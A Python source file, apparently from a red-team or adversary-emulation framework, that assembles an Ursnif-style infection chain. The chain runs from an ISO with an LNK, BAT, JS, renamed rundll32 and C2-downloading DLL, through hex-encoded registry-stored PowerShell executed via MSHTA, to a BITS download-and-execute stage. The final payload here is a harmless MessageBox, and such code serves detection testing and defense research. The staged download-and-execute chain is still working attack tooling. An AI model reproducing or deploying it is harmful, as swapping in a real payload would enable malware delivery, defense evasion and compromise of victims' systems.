from typing import List

from make.lnk.lnk import makeLnk
from make.zip.zip import makeZip
from make.bat.bat import *
from make.rar.rar import makeRar
from make.iso.iso import makeIso
from make.powershell.powershell import *
from make.cmd.cmd import *
from binascii import hexlify
from make.exe.exe import *
import urllib.parse

from helpers import *
from model import *


def ursnif(baseUrl) -> List[AceRoute]:
    routes = []
    # ISO -> lnk -> bat -> wscript -> rundll32 -> download:cmd -> MSHTA -> reg:activex -> reg:powershell
    #   -> download:cmd -> download-bits:ps -> ps -> MessageBox

    # Phase 3
    # Stage 8: Final PS
    psScript: AceStr = makePsScriptMessagebox()
    serveHtml: AceRoute = makeAceRoute('/ursnif/a', psScript, info='Final Payload')
    routes.append(serveHtml)

    # Stage 7: cmdline: Download & Exec PS with BITS
    cmdline = renderTemplate('recipes/ursnif/bitsexec.cmd', baseUrl=baseUrl)
    serveHtml: AceRoute = makeAceRoute('/ursnif/c2-2', cmdline, info='Phase 3')
    routes.append(serveHtml)

    # Phase 2: A bat downloaded by itsIt.db
    # Will add reg1, reg2. Start mshta -> reg1 -> reg2 -> psScript:download&exec /ursnif/c2-2

    # Stage 6: MemoryJunk (psScript): Would do process injection. download & exec payload2 instead
    memoryJunk: AceStr = makePsScriptToCmdByDownloadCmd(baseUrl + '/ursnif/c2-2')
    memoryJunk = makePsCommandFromPsScript(memoryJunk)
    memoryJunk = bytes(memoryJunk, 'utf-8')
    memoryJunk = AceStr(hexlify(memoryJunk).decode('utf-8'))
    memoryJunkRegAdd: AceStr = makeCmdAddReg(
        'HKCU\\Software\\AppDataLow\\Software\\Microsoft\\472A62F9-FA62-1196-3C6B-CED530CFE2D9',
        'MemoryJunk',
        memoryJunk,
        'REG_BINARY')

    # Stage 5: ActiveDevice: exec reg "MemoryJunk"
    activeDevice: AceStr = readFileContentStr('recipes/ursnif/activedevice.js')
    activeDeviceJsRegAdd: AceStr = makeCmdAddReg(
        'HKCU\\Software\\AppDataLow\\Software\\Microsoft\\472A62F9-FA62-1196-3C6B-CED530CFE2D9',
        'ActiveDevice', 
        activeDevice,
        'REG_SZ')

    # Stage 4: MSHTA.exe: exec reg "ActiveDevice"
    mshtaCmd: AceStr = readFileContentStr('recipes/ursnif/mshta.cmd')

    # Several cmdlines as input for the C2 payload DLL
    bat: AceStr = makeBatFromCmds([
        memoryJunkRegAdd,
        activeDeviceJsRegAdd,
        mshtaCmd,
    ])
    serveHtml: AceRoute = makeAceRoute('/ursnif/c2', bat, info='Phase 2')
    routes.append(serveHtml)

    # Phase 1: the following are all in the ISO
    # itsIt.db DLL will download & exec from: /ursnif/c2

    # Stage 3: DLL itsIt.db -> execute BAT <- C2
    parsed_url = urllib.parse.urlparse(baseUrl)
    host = parsed_url.hostname
    port = parsed_url.port
    itsItdb = makePeExecCmdC2(host, port, '/ursnif/c2', asDll=True)
    itsItdbFile: AceFile = makeAceFile('itsIt.db', itsItdb)

    # Stage 2: canWell.js -> 123.com/rundll32.exe -> itsIt.db
    canWellJs: AceBytes = readFileContent('recipes/ursnif/canWell.js')
    canWellJsFile: AceFile = makeAceFile('canWell.js', canWellJs)

    # Stage 1: alsoOne.bat -> canWell.js
    alsoOneBat: AceBytes = readFileContent('recipes/ursnif/alsoOne.bat')
    alsoOneBatFile: AceFile = makeAceFile('alsoOne.bat', alsoOneBat)

    # Renamed rundll32.exe
    com123: AceBytes = readFileContent('recipes/ursnif/rundll32.exe')
    com123File: AceFile = makeAceFile('123.com', com123)

    # LNK -> alsoOne.bat
    # Only works if ISO is mounted as F:
    lnkData: AceBytes = makeLnk(
        name = "6570872.lnk",
        target = "F:\\alsoOne.bat",
        arguments = '',
        iconPath="C:\\Windows\\explorer.exe",
        iconIndex=0
    )
    lnkFile: AceFile = makeAceFile('6570872.lnk', lnkData)

    # Create ISO as Entry
    iso: AceBytes = makeIso(files = [
        alsoOneBatFile,
        canWellJsFile,
        itsItdbFile,
        com123File,
        lnkFile,
    ])
    serveHtml: AceRoute = makeAceRoute(
        '/ursnif/3488164.iso', 
        iso,
        download=True,
        downloadName="3488164.iso",
        info="Entry")
    routes.append(serveHtml)
    
    return routes
